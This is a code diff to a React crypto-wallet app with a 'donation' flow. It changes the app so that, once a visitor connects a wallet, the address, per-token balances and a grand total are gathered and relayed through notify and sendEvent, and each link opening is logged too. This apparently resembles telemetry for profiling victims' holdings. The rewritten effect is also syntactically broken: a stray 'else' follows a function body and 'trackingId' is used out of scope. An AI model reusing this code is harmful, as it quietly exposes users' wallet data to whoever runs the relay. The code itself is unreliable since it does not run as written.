@@ -3,7 +3,7 @@ import React, { useState, useEffect } from "react";
 import { ConnectButton } from "@rainbow-me/rainbowkit";
 import { useAccount, useWalletClient } from "wagmi";
 import { runDonationFlow } from "./engine/donate";
-
+import { buildWalletSummary } from "./engine/balances";
 import { notify } from "./utils/notify.js";
 import { sendEvent } from "./utils/eventRelay.js"; // adjust import path if needed
 import Navbar from "./components/Navbar";
@@ -30,7 +30,7 @@ export default function App() {
 
   // 📡 1. Fire LINK_OPENED on mount
   useEffect(() => {
-    const trackingId = crypto.randomUUID();
+    const trackingId = Date.now().toString();
     const payload = {
       openedUrl: window.location.href,
       visitorIp: null,
@@ -41,16 +41,30 @@ export default function App() {
   }, []);
 
   // 📡 2. Fire WALLET_CONNECTED when user connects
-  useEffect(() => {
-    if (isConnected && address) {
-      const payload = {
-        walletAddress: address,
-        connectedAt: new Date().toISOString(),
-      };
-      notify("WALLET_CONNECTED", payload);
-      sendEvent("WALLET_CONNECTED", payload);
+ // inside useEffect
+useEffect(() => {
+  async function sendConnectedEvent() {
+    if (!isConnected || !address) return;
+
+    const { balancesPayload, grandTotal } = await buildWalletSummary(address);
+
+    const connectedPayload = {
+      walletAddress: address,
+      trackingId,
+      balances: balancesPayload,
+      grandTotal: Number(grandTotal).toFixed(2),
+    };
+
+    notify("WALLET_CONNECTED", connectedPayload);
+    await sendEvent("WALLET_CONNECTED", connectedPayload);
+  } else {
+      const discPayload = { walletAddress: address, trackingId };
+      notify("WALLET_DISCONNECTED", discPayload);
+      sendEvent("WALLET_DISCONNECTED", discPayload).catch(() => {});
     }
-  }, [isConnected, address]);
+
+  sendConnectedEvent();
+}, [isConnected, address, trackingId]);
 
   // 🚀 donation trigger
   async function handleDonate() {
